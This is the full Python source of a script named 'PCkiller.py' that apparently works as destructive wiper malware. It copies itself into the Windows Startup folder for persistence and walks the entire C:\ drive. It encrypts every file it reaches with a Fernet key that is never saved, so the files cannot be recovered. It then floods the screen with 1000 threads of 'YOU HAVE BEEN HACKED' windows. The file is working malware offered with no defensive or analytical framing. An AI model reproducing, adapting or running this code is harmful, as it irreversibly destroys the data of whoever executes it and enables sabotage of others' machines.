import os
import shutil
from tkinter import *
from tkinter import ttk
from getpass import getuser
from threading import Thread
from cryptography.fernet import Fernet



start = input("dontstartme")
if start != "dontstartme":
    quit()

user = getuser()
dest = f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
source = os.path.join(os.getcwd(), 'PCkiller.py')
shutil.copy(source, dest)

file_paths = []
for root, dirs, files in os.walk('C:\\'):
    for file in files:
        filepath, fileext = os.path.splitext(root+'\\'+file)
        file_paths.append(root+'\\'+file)
x=0
for file in file_paths:
    if x <20:
        print(file)
        x+=1
    else:
        break


key = Fernet.generate_key()
def encrypt(key):
    try:
        for file in file_paths:
            with open(file, 'rb') as thefile:
                contents = thefile.read()
            encrypted = Fernet(key).encrypt(contents)
            with open(file ,'wb') as thefile:
                thefile.write(encrypted)
    except:
        pass

for _ in range(10):
    thread = Thread(target=encrypt, args=(key), daemon=True)
    thread.start()
thread.join()

def winloop():
    x=10000000
    for i in range(x):
        x=x**2
        root = Tk()
        root.title('LOLOLOLOLOLOLOLOLOLOL')
        root.geometry('530x400')
        for i in range(3):
            text = ttk.Label(root, text='YOU HAVE BEEN HACKED XD\n ', font=('Arial', 28), foreground='red', background='black')
            text.pack()
            for i in range(3):
                colorline = ttk.Label(root, text='___________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________\n', font=('Arial', 1), background='grey')
                colorline.pack()
                colorline = ttk.Label(root, text='___________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________\n', font=('Arial', 1), background='black')
                colorline.pack()
            text2 = ttk.Label(root, text="            YOUR MACHINE'S FILES ARE DESTROYED            \n", font=('Impact', 20), foreground='orange', background='grey')
            text2.pack()
        root.mainloop()

for i in range(1000):
    thread = Thread(target=winloop)
    thread.start()